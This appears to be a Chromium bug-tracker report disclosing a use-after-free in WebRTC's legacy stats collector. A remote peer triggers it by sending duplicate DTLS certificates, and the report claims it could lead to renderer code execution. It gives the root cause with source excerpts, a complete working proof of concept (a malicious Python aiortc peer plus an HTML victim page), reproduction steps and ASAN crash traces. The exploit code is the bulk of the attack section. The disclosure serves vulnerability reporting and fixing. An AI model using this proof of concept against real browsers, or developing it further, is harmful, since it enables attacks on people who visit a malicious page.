# Use-After-Free in LegacyStatsCollector::AddCertificateReports via Duplicate DTLS Certificate Fingerprints Leads to Renderer Remote Code Execution

| Field | Value |
|-------|-------|
| **Issue ID** | [486495143](https://issues.chromium.org/issues/486495143) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2026-02-22 |
| **Bounty** | $11,000.00 |

## Description

# Use-After-Free in LegacyStatsCollector::AddCertificateReports via Duplicate DTLS Certificate Fingerprints Leads to Renderer Remote Code Execution

## Summary

A use-after-free vulnerability exists in WebRTC's `LegacyStatsCollector::AddCertificateReports()` that allows a malicious remote WebRTC peer to achieve heap memory corruption in the renderer process. When the remote peer sends a DTLS Certificate message containing duplicate certificates (identical fingerprints), the function's internal `ReplaceOrAddNew()` call deletes a `StatsReport` object while a raw pointer (`prev_report`) still references it. The subsequent `prev_report->AddId()` call writes to freed heap memory. Because the freed 40-byte `StatsReport` object is immediately followed by new heap allocations from `AddString()` within the same function, an attacker has a realistic heap-spray window for replacing the freed region, potentially escalating from a crash to arbitrary code execution in the renderer process. No user interaction beyond visiting a page is required; the attacker only needs to complete a WebRTC connection from a malicious signaling endpoint.

## Bisect

Introducing Commit: `d3900296ae4416de2ea21be4548ea4adba8f3280`

- Date: 2015-03-12
- Author: [tommi@webrtc.org](mailto:tommi@webrtc.org)
- Review: <https://webrtc-codereview.appspot.com/47459004>

This commit changed `AddCertificateReports` from using safe `std::string` identifiers to raw `StatsReport*` pointers for tracking the previously created certificate report. The vulnerability pattern was preserved through a subsequent refactor in `e29352bb34de60bd0a56d4ce46c2ce35ac2b27b4` (2016-08-25, [hbos@webrtc.org](mailto:hbos@webrtc.org), <https://codereview.webrtc.org/2259283002>), which inlined the logic into a single loop using `prev_report` and `first_report` raw pointers, the form that exists in the codebase today.

## Root Cause

The `LegacyStatsCollector::AddCertificateReports()` function iterates over a linked list of `SSLCertificateStats` representing a DTLS certificate chain. For each certificate, it creates a `StatsReport` keyed by the certificate's SHA-256 fingerprint and links consecutive reports via an issuer relationship. The function stores a raw pointer `prev_report` to the report created in the previous iteration.

```
// third_party/webrtc/pc/legacy_stats_collector.cc
StatsReport* LegacyStatsCollector::AddCertificateReports(
    std::unique_ptr<SSLCertificateStats> cert_stats) {
  RTC_DCHECK_RUN_ON(pc_->signaling_thread());

  StatsReport* first_report = nullptr;
  StatsReport* prev_report = nullptr;
  for (SSLCertificateStats* stats = cert_stats.get(); stats;
       stats = stats->issuer.get()) {
    StatsReport::Id id(StatsReport::NewTypedId(
        StatsReport::kStatsReportTypeCertificate, stats->fingerprint));

    StatsReport* report = reports_.ReplaceOrAddNew(id);
    report->set_timestamp(stats_gathering_started_);
    report->AddString(StatsReport::kStatsValueNameFingerprint,
                      stats->fingerprint);
    report->AddString(StatsReport::kStatsValueNameFingerprintAlgorithm,
                      stats->fingerprint_algorithm);
    report->AddString(StatsReport::kStatsValueNameDer,
                      stats->base64_certificate);
    if (!first_report)
      first_report = report;
    else
      prev_report->AddId(StatsReport::kStatsValueNameIssuerId, id);  // UAF
    prev_report = report;
  }
  return first_report;
}

```

The critical issue is the interaction between the raw pointer `prev_report` and the `ReplaceOrAddNew()` method. When the stats collection already contains a report with a matching fingerprint ID, `ReplaceOrAddNew()` allocates a new `StatsReport`, deletes the old one, and replaces the pointer in the collection's internal list.

```
// third_party/webrtc/api/legacy_stats_types.cc
StatsReport* StatsCollection::ReplaceOrAddNew(const StatsReport::Id& id) {
  RTC_DCHECK_RUN_ON(&thread_checker_);
  RTC_DCHECK(id.get());
  Container::iterator it = absl::c_find_if(
      list_,
      [&id](const StatsReport* r) -> bool { return r->id()->Equals(id); });
  if (it != end()) {
    StatsReport* report = new StatsReport((*it)->id());
    delete *it;       // deletes the old StatsReport
    *it = report;
    return report;    // returns the NEW report
  }
  return InsertNew(id);
}

```

When the certificate chain contains two adjacent certificates with the same fingerprint, the following sequence occurs. In iteration 0, the first certificate with fingerprint X is inserted into the collection, and `prev_report` is set to point to this new `StatsReport` object (call it `report_A` at address `0x...cd0`). In iteration 1, the second certificate has the same fingerprint X. The call to `ReplaceOrAddNew(X)` finds the existing `report_A` in the collection, allocates a new `StatsReport` (`report_A'` at address `0x...f10`), deletes `report_A`, and replaces the pointer in the list. However, `prev_report` still holds the address of the now-freed `report_A`. The subsequent `prev_report->AddId(...)` call dereferences the freed memory, constituting a heap-use-after-free.

The remote certificate chain originates from the DTLS handshake. In `OpenSSLStreamAdapter::SSLVerifyCallback()`, BoringSSL's `SSL_get0_peer_certificates()` returns the raw certificate list exactly as sent by the remote peer, with no deduplication or validation of chain structure.

```
// third_party/webrtc/rtc_base/openssl_stream_adapter.cc
const STACK_OF(CRYPTO_BUFFER)* chain = SSL_get0_peer_certificates(ssl);
std::vector<std::unique_ptr<SSLCertificate>> cert_chain;
for (CRYPTO_BUFFER* cert : chain) {
  cert_chain.emplace_back(new BoringSSLCertificate(bssl::UpRef(cert)));
}
stream->peer_cert_chain_.reset(new SSLCertChain(std::move(cert_chain)));

```

A malicious remote peer can include the same certificate multiple times in its DTLS Certificate message. The TLS specification does not prohibit this, and BoringSSL does not filter duplicates. The chain is then converted to `SSLCertificateStats` by `SSLCertChain::GetStats()`, which also performs no deduplication, and eventually reaches `AddCertificateReports()` through the call chain `PeerConnection::Close()` to `legacy_stats_->UpdateStats()` to `ExtractSessionInfo_s()`.

No effective mitigations exist on this code path. The `prev_report` and `first_report` variables are raw `StatsReport*` pointers without `raw_ptr<>` (MiraclePtr) protection, as WebRTC third-party code does not use Chromium's smart pointer wrappers. The `StatsCollection` stores reports in a `std::list<StatsReport*>` with no reference counting. All guards on the path are `RTC_DCHECK` (debug-only, compiled out in release builds). There is no PartitionAlloc bucket isolation for WebRTC's heap allocations.

## Reproduce

The PoC consists of two components: a Python malicious WebRTC peer that sends duplicate DTLS certificates, and an HTML page that connects to it and triggers the vulnerable code path. The Python dependencies can be installed with `pip install aiortc aiohttp`.

### poc\_wrtc209\_server.py (malicious WebRTC peer)

```
#!/usr/bin/env python3
"""
Malicious WebRTC peer that sends duplicate DTLS certificates.

This server:
1. Acts as a WebRTC peer with a modified DTLS certificate chain containing
   duplicate certificates (same cert as both leaf and chain cert).
2. Provides HTTP signaling endpoints for SDP exchange.
3. When the browser connects and calls close()/getStats(), the duplicate
   fingerprint triggers UAF in AddCertificateReports().
"""

import asyncio
import json
import logging
import sys
from aiohttp import web
from aiortc import RTCPeerConnection, RTCSessionDescription
from aiortc.rtcdtlstransport import RTCCertificate, SRTP_PROFILES
from OpenSSL import SSL, crypto

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger("wrtc209")


class MaliciousCertificate(RTCCertificate):
    """
    Modified RTCCertificate that adds the same certificate as an extra
    chain cert, causing the DTLS Certificate message to contain
    [leaf_cert, leaf_cert] - duplicate fingerprints.
    """
    def _create_ssl_context(self, srtp_profiles):
        ctx = super()._create_ssl_context(srtp_profiles)
        # Convert cryptography cert to pyOpenSSL X509 for add_extra_chain_cert
        x509_cert = crypto.X509.from_cryptography(self._cert)
        # Add the SAME cert as an extra chain cert -> duplicate fingerprint!
        ctx.add_extra_chain_cert(x509_cert)
        logger.info("Added duplicate cert to chain! Fingerprint will repeat.")
        return ctx


# Create malicious certificate
_base_cert = RTCCertificate.generateCertificate()
malicious_cert = MaliciousCertificate(key=_base_cert._key, cert=_base_cert._cert)

# Track active peer connections
pcs = set()


async def offer(request):
    """Handle SDP offer from browser, return answer."""
    params = await request.json()
    offer_sdp = RTCSessionDescription(sdp=params["sdp"], type=params["type"])

    pc = RTCPeerConnection()
    # Monkey-patch: replace the auto-generated certificate with our malicious one
    # that sends duplicate certs in the DTLS chain
    pc._RTCPeerConnection__certificates = [malicious_cert]
    pcs.add(pc)

    @pc.on("datachannel")
    def on_datachannel(channel):
        logger.info(f"Data channel '{channel.label}' opened")
        @channel.on("message")
        def on_message(message):
            logger.info(f"Received message: {message}")

    @pc.on("connectionstatechange")
    async def on_connectionstatechange():
        logger.info(f"Connection state: {pc.connectionState}")
        if pc.connectionState == "failed":
            await pc.close()
            pcs.discard(pc)

    await pc.setRemoteDescription(offer_sdp)
    answer = await pc.createAnswer()
    await pc.setLocalDescription(answer)

    return web.json_response({
        "sdp": pc.localDescription.sdp,
        "type": pc.localDescription.type,
    })


async def on_shutdown(app):
    coros = [pc.close() for pc in pcs]
    await asyncio.gather(*coros)
    pcs.clear()


# Serve static HTML
async def index(request):
    with open("poc_wrtc209_uaf.html", "r") as f:
        content = f.read()
    return web.Response(content_type="text/html", text=content)


app = web.Application()
app.on_shutdown.append(on_shutdown)
app.router.add_get("/", index)
app.router.add_post("/offer", offer)

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    logger.info(f"Starting malicious WebRTC server on port {port}")
    logger.info(f"Certificate fingerprint: {malicious_cert.getFingerprints()[0].value}")
    web.run_app(app, host="0.0.0.0", port=port)

```
### poc\_wrtc209\_uaf.html (victim page, served by the Python server)

```
<!DOCTYPE html>
<html>
<head><title>AddCertificateReports UAF PoC</title></head>
<body>
<h2>Duplicate DTLS cert fingerprint UAF</h2>
<pre id="log"></pre>
<script>
function log(msg) {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
}

async function triggerUAF() {
  log('[*] Creating RTCPeerConnection...');

  const pc = new RTCPeerConnection();

  pc.oniceconnectionstatechange = () => log('[*] ICE state: ' + pc.iceConnectionState);
  pc.onconnectionstatechange = () => log('[*] Connection state: ' + pc.connectionState);

  // Create data channel to trigger DTLS
  const dc = pc.createDataChannel('poc');
  dc.onopen = () => log('[+] Data channel opened');

  // Create offer
  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);

  // Wait for ICE gathering to complete
  await new Promise(resolve => {
    if (pc.iceGatheringState === 'complete') {
      resolve();
    } else {
      pc.onicegatheringstatechange = () => {
        if (pc.iceGatheringState === 'complete') resolve();
      };
    }
  });

  log('[*] ICE gathering complete. Sending offer to malicious server...');

  // Send offer to malicious Python peer
  const resp = await fetch('/offer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      sdp: pc.localDescription.sdp,
      type: pc.localDescription.type
    })
  });

  const answer = await resp.json();
  log('[*] Got answer from malicious peer. Setting remote description...');
  await pc.setRemoteDescription(answer);

  // Wait for DTLS connection
  await new Promise(resolve => {
    if (pc.connectionState === 'connected') {
      resolve();
    } else {
      pc.onconnectionstatechange = () => {
        log('[*] Connection state: ' + pc.connectionState);
        if (pc.connectionState === 'connected') resolve();
        if (pc.connectionState === 'failed') resolve();
      };
    }
  });

  if (pc.connectionState !== 'connected') {
    log('[!] Connection failed');
    return;
  }

  log('[+] DTLS connected to malicious peer (duplicate cert chain!)');
  log('[*] Waiting 2s for stats to stabilize...');
  await new Promise(r => setTimeout(r, 2000));

  // Trigger UAF: close() calls legacy_stats_->UpdateStats() ->
  // AddCertificateReports() with cert chain containing duplicate fingerprints
  log('[*] Calling pc.close() to trigger AddCertificateReports UAF...');
  pc.close();
  log('[+] pc.close() called. Check ASAN output for heap-use-after-free!');
}

triggerUAF().catch(e => log('[!] Error: ' + e));
</script>
</body>
</html>

```
### Steps to reproduce

To reproduce, first start the malicious Python WebRTC peer by running `python3 poc_wrtc209_server.py 8091`. Then launch Chrome built with AddressSanitizer, pointing it to the malicious server: `ASAN_OPTIONS=detect_odr_violation=0 ./out/asan-release/chrome --no-sandbox --disable-gpu --enable-logging=stderr --user-data-dir=$(mktemp -d) http://localhost:8091/`. The page automatically creates an `RTCPeerConnection`, establishes a data channel with the malicious peer (which sends a DTLS Certificate message containing the same certificate twice), waits for the DTLS connection to complete, and then calls `pc.close()`. The `close()` method unconditionally invokes `legacy_stats_->UpdateStats()`, which processes the remote certificate chain through `AddCertificateReports()`, triggering the heap-use-after-free when the duplicate fingerprint causes `ReplaceOrAddNew()` to delete the report that `prev_report` still points to.

### ASAN output

```
==2009869==ERROR: AddressSanitizer: heap-use-after-free on address 0x7b73549e8ce8 at pc 0x7f33b9fac6f1 bp 0x7b325b33edb0 sp 0x7b325b33eda8
READ of size 8 at 0x7b73549e8ce8 thread T9 (WebRTC_Signalin)
    #0 0x7f33b9fac6f0 in webrtc::StatsReport::AddId(webrtc::StatsReport::StatsValueName, webrtc::scoped_refptr<webrtc::StatsReport::IdBase> const&) gen/third_party/libc++/src/include/__tree:950:54
    #1 0x7f33ba365afe in webrtc::LegacyStatsCollector::AddCertificateReports(std::__Cr::unique_ptr<webrtc::SSLCertificateStats, std::__Cr::default_delete<webrtc::SSLCertificateStats>>) third_party/webrtc/pc/legacy_stats_collector.cc:820:20
    #2 0x7f33ba3672a6 in webrtc::LegacyStatsCollector::ExtractSessionInfo_s(webrtc::LegacyStatsCollector::SessionStats&) third_party/webrtc/pc/legacy_stats_collector.cc:1070:11
    #3 0x7f33ba3627e4 in webrtc::LegacyStatsCollector::ExtractSessionAndDataInfo() third_party/webrtc/pc/legacy_stats_collector.cc:965:3
    #4 0x7f33ba361bb3 in webrtc::LegacyStatsCollector::UpdateStats(webrtc::PeerConnectionInterface::StatsOutputLevel) third_party/webrtc/pc/legacy_stats_collector.cc:733:7
    #5 0x7f33ba1c2dc4 in webrtc::PeerConnection::Close() third_party/webrtc/pc/peer_connection.cc:1901:18
    #6 0x7f33ba0bf8a9 in void absl::internal_any_invocable::LocalInvoker<false, void, webrtc::MethodCall<webrtc::PeerConnectionInterface, void>::Marshal(webrtc::Thread*)::'lambda'()&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/pc/proxy.h:94:5
    #7 0x7f336b645e63 in webrtc::ThreadWrapper::RunTaskQueueTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #8 0x7f336b6487bd in base::internal::Invoker<...>::RunImpl<...>() base/functional/bind_internal.h:740:12
    #9 0x7f33d3d60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #10 0x7f33d3de216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #11 0x7f33d3de1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #12 0x7f33d3c033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #13 0x7f33d3de37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #14 0x7f33d3ccb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #15 0x7f33d3e79832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #16 0x7f33d3e79e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #17 0x7f33d3edde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #18 0x561e5dea9316 in asan_thread_start(void*) asan_interceptors.cpp

0x7b73549e8ce8 is located 24 bytes inside of 40-byte region [0x7b73549e8cd0,0x7b73549e8cf8)
freed by thread T9 (WebRTC_Signalin) here:
    #0 0x561e5dee5dd2 in operator delete(void*, unsigned long) (chrome+0x6825dd2)
    #1 0x7f33b9fad04f in webrtc::StatsCollection::ReplaceOrAddNew(webrtc::scoped_refptr<webrtc::StatsReport::IdBase> const&) third_party/webrtc/api/legacy_stats_types.cc:837:5
    #2 0x7f33ba3659cd in webrtc::LegacyStatsCollector::AddCertificateReports(std::__Cr::unique_ptr<webrtc::SSLCertificateStats, std::__Cr::default_delete<webrtc::SSLCertificateStats>>) third_party/webrtc/pc/legacy_stats_collector.cc:805:36
    #3 0x7f33ba3672a6 in webrtc::LegacyStatsCollector::ExtractSessionInfo_s(webrtc::LegacyStatsCollector::SessionStats&) third_party/webrtc/pc/legacy_stats_collector.cc:1070:11
    #4 0x7f33ba3627e4 in webrtc::LegacyStatsCollector::ExtractSessionAndDataInfo() third_party/webrtc/pc/legacy_stats_collector.cc:965:3
    #5 0x7f33ba361bb3 in webrtc::LegacyStatsCollector::UpdateStats(webrtc::PeerConnectionInterface::StatsOutputLevel) third_party/webrtc/pc/legacy_stats_collector.cc:733:7
    #6 0x7f33ba1c2dc4 in webrtc::PeerConnection::Close() third_party/webrtc/pc/peer_connection.cc:1901:18
    #7 0x7f33ba0bf8a9 in void absl::internal_any_invocable::LocalInvoker<false, void, webrtc::MethodCall<webrtc::PeerConnectionInterface, void>::Marshal(webrtc::Thread*)::'lambda'()&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/pc/proxy.h:94:5
    #8 0x7f336b645e63 in webrtc::ThreadWrapper::RunTaskQueueTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #9 0x7f336b6487bd in base::internal::Invoker<...>::RunImpl<...>() base/functional/bind_internal.h:740:12
    #10 0x7f33d3d60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #11 0x7f33d3de216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #12 0x7f33d3de1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #13 0x7f33d3c033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #14 0x7f33d3de37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #15 0x7f33d3ccb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #16 0x7f33d3e79832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #17 0x7f33d3e79e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #18 0x7f33d3edde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #19 0x561e5dea9316 in asan_thread_start(void*) asan_interceptors.cpp

previously allocated by thread T9 (WebRTC_Signalin) here:
    #0 0x561e5dee51cd in operator new(unsigned long) (chrome+0x68251cd)
    #1 0x7f33b9facff6 in webrtc::StatsCollection::ReplaceOrAddNew(webrtc::scoped_refptr<webrtc::StatsReport::IdBase> const&) third_party/webrtc/api/legacy_stats_types.cc
    #2 0x7f33ba3659cd in webrtc::LegacyStatsCollector::AddCertificateReports(std::__Cr::unique_ptr<webrtc::SSLCertificateStats, std::__Cr::default_delete<webrtc::SSLCertificateStats>>) third_party/webrtc/pc/legacy_stats_collector.cc:805:36
    #3 0x7f33ba3672a6 in webrtc::LegacyStatsCollector::ExtractSessionInfo_s(webrtc::LegacyStatsCollector::SessionStats&) third_party/webrtc/pc/legacy_stats_collector.cc:1070:11
    #4 0x7f33ba3627e4 in webrtc::LegacyStatsCollector::ExtractSessionAndDataInfo() third_party/webrtc/pc/legacy_stats_collector.cc:965:3
    #5 0x7f33ba361bb3 in webrtc::LegacyStatsCollector::UpdateStats(webrtc::PeerConnectionInterface::StatsOutputLevel) third_party/webrtc/pc/legacy_stats_collector.cc:733:7
    #6 0x7f33ba1c2dc4 in webrtc::PeerConnection::Close() third_party/webrtc/pc/peer_connection.cc:1901:18
    #7 0x7f33ba0bf8a9 in void absl::internal_any_invocable::LocalInvoker<false, void, webrtc::MethodCall<webrtc::PeerConnectionInterface, void>::Marshal(webrtc::Thread*)::'lambda'()&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/pc/proxy.h:94:5
    #8 0x7f336b645e63 in webrtc::ThreadWrapper::RunTaskQueueTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #9 0x7f336b6487bd in base::internal::Invoker<...>::RunImpl<...>() base/functional/bind_internal.h:740:12
    #10 0x7f33d3d60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #11 0x7f33d3de216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #12 0x7f33d3de1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #13 0x7f33d3c033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #14 0x7f33d3de37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #15 0x7f33d3ccb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #16 0x7f33d3e79832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #17 0x7f33d3e79e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #18 0x7f33d3edde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #19 0x561e5dea9316 in asan_thread_start(void*) asan_interceptors.cpp

Thread T9 (WebRTC_Signalin) created by T0 here:
    #0 0x561e5de8f0d1 in pthread_create (chrome+0x67cf0d1)
    #1 0x7f33d3edd54c in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) base/threading/platform_thread_posix.cc:153:13
    #2 0x7f33d3e783b0 in base::Thread::StartWithOptions(base::Thread::Options) base/threading/thread.cc:228:26
    #3 0x7f336a8a961e in blink::PeerConnectionDependencyFactory::CreatePeerConnectionFactory() third_party/blink/renderer/modules/peerconnection/peer_connection_dependency_factory.cc:431:32
    #4 0x7f336a8a91ae in blink::PeerConnectionDependencyFactory::GetPcFactory() third_party/blink/renderer/modules/peerconnection/peer_connection_dependency_factory.cc:738:5
    #5 0x7f336a8b1c62 in blink::PeerConnectionDependencyFactory::CreatePeerConnection(webrtc::PeerConnectionInterface::RTCConfiguration const&, blink::WebLocalFrame*, webrtc::PeerConnectionObserver*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/peer_connection_dependency_factory.cc:1006:8
    #6 0x7f336a984c5e in blink::RTCPeerConnectionHandler::Initialize(blink::ExecutionContext*, webrtc::PeerConnectionInterface::RTCConfiguration const&, blink::WebLocalFrame*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection_handler.cc:898:50
    #7 0x7f336a93e0d7 in blink::RTCPeerConnection::RTCPeerConnection(blink::ExecutionContext*, webrtc::PeerConnectionInterface::RTCConfiguration, bool, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc:688:23
    #8 0x7f336a93d548 in blink::RTCPeerConnection* blink::MakeGarbageCollected<...>(...) v8/include/cppgc/allocation.h:239:32
    #9 0x7f336a93aacb in blink::RTCPeerConnection::Create(blink::ExecutionContext*, blink::RTCConfiguration const*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc:611:40

Shadow bytes around the buggy address:
  0x7b73549e8a00: f7 fa 00 00 00 00 00 fa f7 fa fd fd fd fd fd fd
  0x7b73549e8a80: f7 fa fd fd fd fd fd fd f7 fa 00 00 00 00 00 00
  0x7b73549e8b00: f7 fa 00 00 00 00 00 00 f7 fa 00 00 00 00 00 00
  0x7b73549e8b80: f7 fa fd fd fd fd fd fd f7 fa fd fd fd fd fd fd
  0x7b73549e8c00: f7 fa 00 00 00 00 00 00 f7 fa fd fd fd fd fd fd
=>0x7b73549e8c80: f7 fa fd fd fd fd fd fd f7 fa fd fd fd[fd]fd fa
  0x7b73549e8d00: f7 fa fd fd fd fd fd fd f7 fa fd fd fd fd fd fd
  0x7b73549e8d80: f7 fa fd fd fd fd fd fd f7 fa fd fd fd fd fd fd
  0x7b73549e8e00: f7 fa fd fd fd fd fd fd f7 fa 00 00 00 00 00 00
  0x7b73549e8e80: f7 fa fd fd fd fd fd fd f7 fa fd fd fd fd fd fd
  0x7b73549e8f00: f7 fa 00 00 00 00 00 fa f7 fa fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  ASan internal:           fe
==2009869==ABORTING

```

Tested on Chromium at commit `f51a685e768b632262beaf8bd95387fffe096655`.

## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [poc_wrtc209_server.py](attachments/poc_wrtc209_server.py) (text/x-python, 3.5 KB)
- [poc_wrtc209_uaf.html](attachments/poc_wrtc209_uaf.html) (text/html, 2.5 KB)
- [asan.log](attachments/asan.log) (text/plain, 41.9 KB)

## Timeline

### an...@chromium.org (2026-02-23)

tommi@ can you PTAL? Thanks!

### aj...@google.com (2026-02-26)

Hello it would help us if you could upload the complete asan trace including all additional information.

### je...@gmail.com (2026-02-26)

```
==3758751==ERROR: AddressSanitizer: heap-use-after-free on address 0x7c3f784f6628 at pc 0x7fffdd32fa01 bp 0x7bfa7ece1dd0 sp 0x7bfa7ece1dc8
READ of size 8 at 0x7c3f784f6628 thread T9 (WebRTC_Signalin)
    #0 0x7fffdd32fa00 in webrtc::StatsReport::AddId(webrtc::StatsReport::StatsValueName, webrtc::scoped_refptr<webrtc::StatsReport::IdBase> const&) gen/third_party/libc++/src/include/__tree:950:54
    #1 0x7fffdd6df912 in webrtc::LegacyStatsCollector::AddCertificateReports(std::__Cr::unique_ptr<webrtc::SSLCertificateStats, std::__Cr::default_delete<webrtc::SSLCertificateStats>>) third_party/webrtc/pc/legacy_stats_collector.cc:810:20
    #2 0x7fffdd6e0fd6 in webrtc::LegacyStatsCollector::ExtractSessionInfo_s(webrtc::LegacyStatsCollector::SessionStats&) third_party/webrtc/pc/legacy_stats_collector.cc:1058:11
    #3 0x7fffdd6dc874 in webrtc::LegacyStatsCollector::ExtractSessionAndDataInfo() third_party/webrtc/pc/legacy_stats_collector.cc:953:3
    #4 0x7fffdd6dbc43 in webrtc::LegacyStatsCollector::UpdateStats(webrtc::PeerConnectionInterface::StatsOutputLevel) third_party/webrtc/pc/legacy_stats_collector.cc:733:7
    #5 0x7fffdd53ce14 in webrtc::PeerConnection::Close() third_party/webrtc/pc/peer_connection.cc:1901:18
    #6 0x7fffdd43b959 in void absl::internal_any_invocable::LocalInvoker<false, void, webrtc::MethodCall<webrtc::PeerConnectionInterface, void>::Marshal(webrtc::Thread*)::'lambda'()&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/pc/proxy.h:94:5
    #7 0x7fff8f20c203 in webrtc::ThreadWrapper::RunTaskQueueTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #8 0x7fff8f20eb5d in void base::internal::Invoker<base::internal::FunctorTraits<void (webrtc::ThreadWrapper::*&&)(absl::AnyInvocable<void () &&>), base::WeakPtr<webrtc::ThreadWrapper>&&, absl::AnyInvocable<void () &&>&&>, base::internal::BindState<true, true, false, void (webrtc::ThreadWrapper::*)(absl::AnyInvocable<void () &&>), base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>, void ()>::RunImpl<void (webrtc::ThreadWrapper::*)(absl::AnyInvocable<void () &&>), std::__Cr::tuple<base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>, 0ul, 1ul>(void (webrtc::ThreadWrapper::*&&)(absl::AnyInvocable<void () &&>), std::__Cr::tuple<base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>) base/functional/bind_internal.h:740:12
    #9 0x7ffff6b60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #10 0x7ffff6be216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #11 0x7ffff6be1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #12 0x7ffff6a033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #13 0x7ffff6be37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #14 0x7ffff6acb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #15 0x7ffff6c79832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #16 0x7ffff6c79e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #17 0x7ffff6cdde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #18 0x55555bd42616 in asan_thread_start(void*) asan_interceptors.cpp

0x7c3f784f6628 is located 24 bytes inside of 40-byte region [0x7c3f784f6610,0x7c3f784f6638)
